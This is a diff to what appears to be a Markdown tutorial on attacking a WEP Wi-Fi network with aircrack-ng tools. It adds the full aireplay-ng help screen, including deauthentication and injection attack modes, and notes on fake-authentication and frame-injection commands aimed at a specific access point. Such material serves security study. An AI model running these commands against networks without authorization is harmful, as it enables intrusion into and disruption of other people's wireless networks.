@@ -278,7 +278,97 @@ Output Text:
  E8:94:F6:F2:F1:E1  50:82:D5:91:1B:32  -58   48e-24      0        4  
 ```
 
-## Beacon Frame For Channel
+
+## Aireplay-ng
+
+The ***help*** using `aireplay-ng --help`:  
+
+```
+
+  Aireplay-ng 1.2 rc4 - (C) 2006-2015 Thomas d'Otreppe
+  http://www.aircrack-ng.org
+
+  usage: aireplay-ng <options> <replay interface>
+
+  Filter options:
+
+      -b bssid  : MAC address, Access Point
+      -d dmac   : MAC address, Destination
+      -s smac   : MAC address, Source
+      -m len    : minimum packet length
+      -n len    : maximum packet length
+      -u type   : frame control, type    field
+      -v subt   : frame control, subtype field
+      -t tods   : frame control, To      DS bit
+      -f fromds : frame control, From    DS bit
+      -w iswep  : frame control, WEP     bit
+      -D        : disable AP detection
+
+  Replay options:
+
+      -x nbpps  : number of packets per second
+      -p fctrl  : set frame control word (hex)
+      -a bssid  : set Access Point MAC address
+      -c dmac   : set Destination  MAC address
+      -h smac   : set Source       MAC address
+      -g value  : change ring buffer size (default: 8)
+      -F        : choose first matching packet
+
+      Fakeauth attack options:
+
+      -e essid  : set target AP SSID
+      -o npckts : number of packets per burst (0=auto, default: 1)
+      -q sec    : seconds between keep-alives
+      -Q        : send reassociation requests
+      -y prga   : keystream for shared key auth
+      -T n      : exit after retry fake auth request n time
+
+      Arp Replay attack options:
+
+      -j        : inject FromDS packets
+
+      Fragmentation attack options:
+
+      -k IP     : set destination IP in fragments
+      -l IP     : set source IP in fragments
+
+      Test attack options:
+
+      -B        : activates the bitrate test
+
+  Source options:
+
+      -i iface  : capture packets from this interface
+      -r file   : extract packets from this pcap file
+
+  Miscellaneous options:
+
+      -R                    : disable /dev/rtc usage
+      --ignore-negative-one : if the interface's channel can't be determined,
+                              ignore the mismatch, needed for unpatched cfg80211
+
+  Attack modes (numbers can still be used):
+
+      --deauth      count : deauthenticate 1 or all stations (-0)
+      --fakeauth    delay : fake authentication with AP (-1)
+      --interactive       : interactive frame selection (-2)
+      --arpreplay         : standard ARP-request replay (-3)
+      --chopchop          : decrypt/chopchop WEP packet (-4)
+      --fragment          : generates valid keystream   (-5)
+      --caffe-latte       : query a client for new IVs  (-6)
+      --cfrag             : fragments against a client  (-7)
+      --migmode           : attacks WPA migration mode  (-8)
+      --test              : tests injection and quality (-9)
+
+      --help              : Displays this usage screen
+```
+
+
+
+
+## Beacon Frame For Channel 6
+
+Will will use `aireplay-ng` for this task with option `-1`. It performs the ***fake authentication***  
 
 Beacon Command:  
 `sudo aireplay-ng -1 600 -a E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
@@ -298,7 +388,9 @@ The interface MAC (AC:7B:A1:84:EB:D5) doesn't match the specified MAC (-h).
 
 ## Start Capturing Packets
 
-Create Cap Command:  
+Will will use `aireplay-ng` for this task with option `-2`. It performs the ***interactive frame selection***. 
+
+Command to Create Packets In Cap:  
 `sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b E8:94:F6:F2:F1:E1 -h 12:34:45:67:89:01 wlp2s0mon`  
 Writes the data frames or packets in the `<WEP_Network>.cap`.
 
